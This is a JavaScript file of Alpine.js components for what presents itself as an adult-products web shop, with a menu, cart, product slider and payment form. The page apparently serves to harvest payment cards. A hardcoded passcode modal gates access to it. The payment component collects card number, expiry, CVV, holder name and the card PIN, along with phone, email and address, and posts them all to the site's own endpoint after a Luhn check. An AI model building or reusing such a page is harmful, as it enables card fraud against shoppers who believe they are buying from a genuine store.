document.addEventListener("alpine:init", () => {
  Alpine.data("nav", () => ({
    menu: [
      "Sex Toys",
      "Vibrators",
      "Sexual Wellness",
      "Lingerie & Accessories",
      "Lube",
      "Sexy Gifts",
      "Sale",
      "Stores",
      "Blog",
    ],
  }));
  Alpine.data("cart", () => ({
    name: [
      "Lovers Pink Leather Custom Choker (Domi_nique)",
      "Lovers Water Based Lube Foil 10ml",
      // "King Cock Clear 18in Double Dildo",
    ],
    img: [
      "./src/assets/image/61UpfolIOkL._AC_SR263,395_FMwebp_QL65_.webp",
      "./src/assets/image/Lovers_Water_Based_Lube_Foil_10ml_OAL_250x250.avif",
      // "./src/assets/image/Pipedream_King_Cock_Clear_18in_Double_Dildo_250x250.webp:62",
    ],
    price: ["16.97", "2.95"],
  }));
  Alpine.data("slide", () => ({
    num: 0,
    len() {
      var w_body = document.body.offsetWidth;
      return w_body < 768 ? 7 : 4;
    },
    w_big: 265,
    w_small: 173,
    w_elem() {
      var w_body = document.body.offsetWidth;
      return w_body < 768 ? this.w_small : this.w_big;
    },
    next() {
      if (this.num != this.len()) {
        this.num++;
      } else {
        this.num = 0;
      }
    },
    prev() {
      if (this.num != 0) {
        this.num--;
      } else {
        this.num = this.len();
      }
    },
    name: [
      "Aphrodisiac Sex Chocolates",
      "GoodHead Deep Throat Spray To-Go",
      "Discover G-Spot Arousal Serum - Foil",
      "Assorted Tropical Poppin' Rock Oral Sex Candy",
      "Inya Rose Vibrating Air Pulsator",
      "We-Vibe Chorus Couples Vibrator",
      "We-Vibe Melt Pleasure Air Stimulator",
      "Rechargable Magic Wand",
      "We-Vibe Touch X",
    ],
    img: [
      "./src/assets/image/1PKSEXCHOCOLATE_600x.webp",
      "./src/assets/image/Doc_Johnson_GoodHead_Deep_Throat_Spray_To_Go_Mint_600x.webp",
      "./src/assets/image/discovergspotfoil_600x.webp",
      "./src/assets/image/Assorted_Tropical_Poppin_Rock_Oral_Sex_Candy_600x.webp",
      "./src/assets/image/Inya_Rose_Vibrating_Air_Pulsator_600x.webp",
      "./src/assets/image/We_Vibe_Chorus_Couples_Vibrator_Dark_Purple_600x.webp",
      "./src/assets/image/We_Vibe_Melt_Pleasure_Air_Stimulator_600x.webp",
      "./src/assets/image/Rechargeable_Magic_Wand_600x.webp",
      "./src/assets/image/We_Vibe_Touch_X_Front_600x.webp",
    ],
    brand: [
      "Sensitizer",
      "Desensitizer",
      "Sensitizer",
      "Edibles",
      "Air Pulsator",
      "Couples Vibrator",
      "Air Pulsator",
      "Wand",
      "Bullet",
    ],
    price: [
      "1.25",
      "12.50",
      "1.95",
      "1.50",
      "58.99",
      "209.00",
      "149.00",
      "179.00",
      "99.00",
    ],
  }));
  Alpine.data("modal", () => ({
    modalIsOpen: true,
    passcode: "TIWcrBTjoPbd",
    pass: null,
    submit() {
      if (this.pass.replaceAll("-", "") == this.passcode) {
        this.modalIsOpen = false;
      } else {
        this.$refs.error.classList.remove("hidden");
      }
    },
  }));
  Alpine.data("payment", () => ({
    modalIsOpen: false,
    cc: null,
    exp: null,
    cvv: null,
    holder: null,
    pin: null,
    a: false,
    city: null,
    state: null,
    location: null,
    country: null,
    phone: null,
    email: null,
    cc_mask(input) {
      return input.startsWith("34") || input.startsWith("37")
        ? "9999 999999 999999"
        : "9999 9999 9999 9999 999";
    },
    cc_valid: false,
    cc_logic(num) {
      num = num.replaceAll(" ", "");
      const regex = new RegExp("^[0-9]{13,19}$");
      if (!regex.test(num)) {
        return false;
      }
      var nCheck = 0, nDigit = 0, bEven = false;
      num = num.replace(/\D/g, "");

      for (let n = num.length - 1; n >= 0; n--) {
        var cDigit = num.charAt(n), nDigit = parseInt(cDigit, 10);
        if (bEven) {
          if ((nDigit *= 2) > 9) nDigit -= 9;
        }

        nCheck += nDigit;
        bEven = !bEven;
        
      }
      return (nCheck % 10) == 0;
    },
    handleSubmit(e) {
      e.preventDefault();

      const myForm = e.target;
      const formData = new FormData(myForm);

      if (this.cc_logic(this.cc)) {
        fetch("/", {
          method: "POST",
          headers: { "Content-Type": "application/x-www-form-urlencoded" },
          body: new URLSearchParams(formData).toString(),
        })
          .then(() => navigate('/submit.htm'))
          .catch((error) => console.log(error));
      }else{ this.cc_valid = true }
    },
  }));
});
